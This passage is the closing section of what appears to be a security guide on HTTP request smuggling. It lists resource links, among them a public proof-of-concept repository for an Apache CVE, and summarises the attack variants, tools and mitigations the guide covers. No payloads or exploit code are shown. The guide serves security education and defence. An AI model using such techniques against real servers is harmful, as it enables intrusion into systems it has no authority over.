- Apache CVE-2023-25690 POC: https://github.com/dhmosfunk/CVE-2023-25690-POC

### Additional Resources
- HackTricks: https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
- The Hacker Recipes: https://www.thehacker.recipes/web/config/http-request-smuggling/
- YesWeHack Guide: https://www.yeswehack.com/learn-bug-bounty/http-request-smuggling-guide-vulnerabilities

---

## Summary

HTTP request smuggling remains a critical threat in 2026, with CVSS scores up to 9.9 affecting major infrastructure providers. This guide provides comprehensive coverage of:

- **20 Exploitation Techniques** with step-by-step exploitation techniques
- **All Attack Techniques**: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, CL.0, pause-based, client-side desync
- **Industry Standards**: OWASP, MITRE, NIST, PCI DSS compliance requirements
- **Real-World CVEs**: From 2020-2025 including critical vulnerabilities in Akamai, ASP.NET, Apache, F5
- **Complete Tool Arsenal**: Burp Suite, open-source scanners, automated detection tools
- **Prevention Strategies**: Secure coding practices, server hardening, configuration guidelines
- **Research Foundation**: James Kettle's groundbreaking Black Hat series earning $260k+ in bug bounties

**Primary Mitigation:** Use HTTP/2 end-to-end with strict RFC compliance. If HTTP/1.1 required, implement comprehensive header validation and reject all ambiguous requests.

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Total Lab Coverage:** 20/20 web security labs
**Total Pages:** 150+ pages of exploitation techniques and prevention strategies
